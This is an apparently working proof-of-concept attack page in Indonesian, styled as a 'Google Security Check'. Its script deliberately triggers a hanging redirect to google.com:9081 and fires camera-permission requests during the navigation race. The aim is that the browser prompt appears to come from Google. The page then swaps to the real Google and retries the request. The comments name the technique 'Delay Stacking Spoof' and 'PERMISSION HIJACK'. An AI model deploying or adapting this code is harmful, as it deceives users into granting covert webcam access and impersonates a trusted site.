<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Security Check</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
  h2 { color: #4285f4; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Check</h2>
  <p>Klik untuk memverifikasi akun Google Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var GOOGLE_DELAY = "http://google.com:9081"; // Port Delay
  var GOOGLE_REAL = "https://www.google.com"; // Google Asli

  // ============================================
  // FUNGSI: PERMISSION REQUEST (TOP-LEVEL)
  // ============================================
  function triggerCameraPermission() {
    try {
      log("[+] Meminta Izin Kamera...");
      
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          var video = document.getElementById('cam-feed');
          video.srcObject = stream;
          video.play().catch(function(){});
          log("[+] Kamera BERHASIL diakses!");
        })
        .catch(function(err) {
          log("[-] Kamera diblokir: " + err.name);
        });
    } catch(e) {}
  }

  // ============================================
  // TRIGGER RACE STACKING (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Delay Stacking Spoof...");

    // ============================================
    // A. REDIRECT KE PORT 9081 (0ms)
    // ============================================
    // Mulai transisi ke Google:9081 (akan hang).
    try {
      log("[+] Redirect ke google.com:9081...");
      window.location.href = GOOGLE_DELAY;
    } catch(e) {}

    // ============================================
    // B. PERMISSION HIJACK (10ms)
    // ============================================
    // Tembak izin kamera saat browser sedang hang di 9081.
    setTimeout(function() {
      log("[+] Meminta Izin Kamera (Stacked)...");
      triggerCameraPermission();
    }, 10);

    // ============================================
    // C. REDIRECT KE GOOGLE ASLI (150ms)
    // ============================================
    // Timpa dengan Google asli agar user melihat Google setelah prompt muncul.
    setTimeout(function() {
      log("[+] Menimpa dengan Google Asli...");
      try {
        window.location.href = GOOGLE_REAL;
      } catch(e) {}
    }, 150);

    // ============================================
    // D. RETRY PERMISSION (500ms)
    // ============================================
    // Jika prompt gagal muncul di awal, coba lagi saat sudah di Google.
    setTimeout(function() {
      log("[+] Retry Izin Kamera (di Google)...");
      triggerCameraPermission();
    }, 500);

  }, { once: true });

})();
</script>
</body>
</html>
